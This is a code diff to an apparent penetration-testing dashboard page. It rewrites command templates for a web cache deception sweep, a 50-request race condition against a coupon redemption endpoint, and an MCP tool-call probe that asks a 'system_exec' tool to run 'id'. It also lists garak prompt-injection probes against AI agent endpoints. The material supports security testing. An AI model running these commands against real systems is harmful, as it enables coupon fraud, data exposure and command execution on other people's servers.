@@ -3291,7 +3291,7 @@ body {
         </div>
         <div class="auto-fw-cmd-box">
           <button type="button" class="auto-fw-copy-btn" onclick="copyAutoFwCmd('fw2')">COPY</button>
-          <code class="auto-fw-cmd" id="cmdFw2">ffuf -u "https://$TARGET/api/user/profileFUZZ.css" -w /opt/reconforge/wordlists/wcd_delimiters.txt -mc 200 -ac -silent -o wcd_hits.json &amp;&amp; python3 -m reconforge.h2_race --target "https://$TARGET/api/v1/coupon/redeem" --streams 50 --coalesce</code>
+          <code class="auto-fw-cmd" id="cmdFw2">printf ";\n!\n%23\n%3F\n%00\n..%2f" > wcd_delims.txt &amp;&amp; ffuf -u "https://$TARGET/api/user/profileFUZZ.css" -w wcd_delims.txt -mc 200 -ac -silent -o wcd_hits.json &amp;&amp; ffuf -u "https://$TARGET/api/v1/coupon/redeem" -X POST -H "Authorization: Bearer $TOKEN" -d '{"code":"RACE2026"}' -w &lt;(seq 1 50) -t 50 -mc 200,400 -silent -o race_results.json</code>
         </div>
         <div class="auto-fw-gate">
           <span>🛡️ TRIAGE GATE:</span> Differential byte delta &amp; timing anomaly detection (&gt;10ms or &gt;5 byte shift) confirms state race bypass.
@@ -3618,11 +3618,12 @@ python3 -c "import json; [print(f'[CRITICAL BOLA] {h}') for h in json.load(open(
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">20b.</span>Autonomous HTTP/2 Single-Packet Race &amp; Protocol Desync Daemon</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># Automated Web Cache Deception (WCD) path delimiter matrix sweep</span>
-ffuf -u "https://target.com/api/user/profileFUZZ.css" -w /opt/reconforge/wordlists/wcd_delimiters.txt \
-  -mc 200 -ac -silent -o wcd_hits.json
+printf ";\n!\n%%23\n%%3F\n%%00\n..%%2f" > wcd_delims.txt
+ffuf -u "https://target.com/api/user/profileFUZZ.css" -w wcd_delims.txt -mc 200 -ac -silent -o wcd_hits.json
 
-<span class="comment"># Single-packet frame blast over HTTP/2 multiplexing (collapsing 50 requests into 1 TCP window)</span>
-python3 -m reconforge.h2_race --target "https://target.com/api/v1/voucher/apply" --streams 50 --coalesce</code></pre></div></div></div>
+<span class="comment"># 50-worker concurrent race condition blast via standard ffuf (collapsing requests into single window)</span>
+ffuf -u "https://target.com/api/v1/voucher/apply" -X POST -H "Authorization: Bearer $TOKEN" \
+  -d '{"code":"RACE2026"}' -w <(seq 1 50) -t 50 -mc 200,400 -silent -o race_results.json</code></pre></div></div></div>
 
     <div class="step"><div class="step-head"><div class="step-title"><span class="idx">20c.</span>Autonomous Secret Intelligence with Live Key Verification (TruffleHog v3 Daemon)</div><div class="step-toggle">▼</div></div>
     <div class="step-body"><div class="step-body-inner"><pre><code><span class="comment"># TruffleHog live verified key scanning — queries remote provider APIs to confirm live tokens</span>
@@ -3636,8 +3637,10 @@ trufflehog filesystem ./crawled_js_data/ --only-verified --json &gt; verified_we
 garak --model_type rest --target "https://target.com/api/v1/agent" \
   --probes promptinject,encoding,dan,continuation --report_prefix garak_2026_audit
 
-<span class="comment"># Autonomous Model Context Protocol (MCP) tool permission boundary fuzzing</span>
-python3 -m reconforge.mcp_fuzzer --target "https://target.com/mcp" --attack tool_hijack,unauthorized_exec</code></pre></div></div></div>
+<span class="comment"># Autonomous Model Context Protocol (MCP) JSON-RPC tool-calling boundary fuzzing</span>
+curl -s -X POST "https://target.com/mcp/v1/tools/call" \
+  -H "Content-Type: application/json" \
+  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"system_exec","arguments":{"cmd":"id"}},"id":1}' | jq .</code></pre></div></div></div>
   </div>
 
   <!-- PHASE 7 -->
@@ -9620,6 +9623,26 @@ function toggleDefcon(){
     btn.querySelector('.defcon-dot').style.background = d.color;
     btn.querySelector('.defcon-dot').style.boxShadow = '0 0 8px ' + d.color;
   }
+  
+  // Real Operational Posture Link: Adjust CLI Pipeline Generator parameters
+  const tEl = document.getElementById('cbThreads');
+  const rlEl = document.getElementById('cbRateLimit');
+  const sEl = document.getElementById('cbNucleiSev');
+  if(curDefconIdx === 0){ // DEFCON 1: KINETIC
+    if(tEl) tEl.value = '100';
+    if(rlEl) rlEl.value = '300';
+    if(sEl) sEl.value = 'critical,high,medium';
+  } else if(curDefconIdx === 1){ // DEFCON 2: TARGETED
+    if(tEl) tEl.value = '50';
+    if(rlEl) rlEl.value = '150';
+    if(sEl) sEl.value = 'critical,high';
+  } else if(curDefconIdx === 2){ // DEFCON 3: STEALTH
+    if(tEl) tEl.value = '25';
+    if(rlEl) rlEl.value = '50';
+    if(sEl) sEl.value = 'critical,high';
+  }
+  if(typeof initPipelineGenerator === 'function') initPipelineGenerator();
+
   playSfx('defcon');
   showHudToast('OPERATIONAL POSTURE SHIFT', d.text, d.desc);
 }
@@ -10132,7 +10155,7 @@ function updateAutoVaptDisplay(){
   if(c1) c1.textContent = `subfinder -d ${target} -all -silent | dnsx -silent -r 1.1.1.1,8.8.8.8 -wd ${target} | katana -headless -no-sandbox -concurrency 25 -jc -d 3 -silent -o katana_dom.jsonl && subzy run --targets katana_dom.jsonl --hide_fails --verify_ssl`;
 
   const c2 = document.getElementById('cmdFw2');
-  if(c2) c2.textContent = `ffuf -u "https://${target}/api/user/profileFUZZ.css" -w /opt/reconforge/wordlists/wcd_delimiters.txt -mc 200 -ac -silent -o wcd_hits.json && python3 -m reconforge.h2_race --target "https://${target}/api/v1/coupon/redeem" --streams 50 --coalesce`;
+  if(c2) c2.textContent = `printf ";\\n!\\n%23\\n%3F\\n%00\\n..%2f" > wcd_delims.txt && ffuf -u "https://${target}/api/user/profileFUZZ.css" -w wcd_delims.txt -mc 200 -ac -silent -o wcd_hits.json && ffuf -u "https://${target}/api/v1/coupon/redeem" -X POST -H "Authorization: Bearer $TOKEN" -d '{"code":"RACE2026"}' -w <(seq 1 50) -t 50 -mc 200,400 -silent -o race_results.json`;
 
   const c3 = document.getElementById('cmdFw3');
   if(c3) c3.textContent = `schemathesis run "https://${target}/openapi.json" --checks all --validate-schema=true --workers 10 --report-dir ./api_reports/ && jwt_tool -t "https://${target}/api/me" -rh "Authorization: Bearer $TOKEN" -M at`;
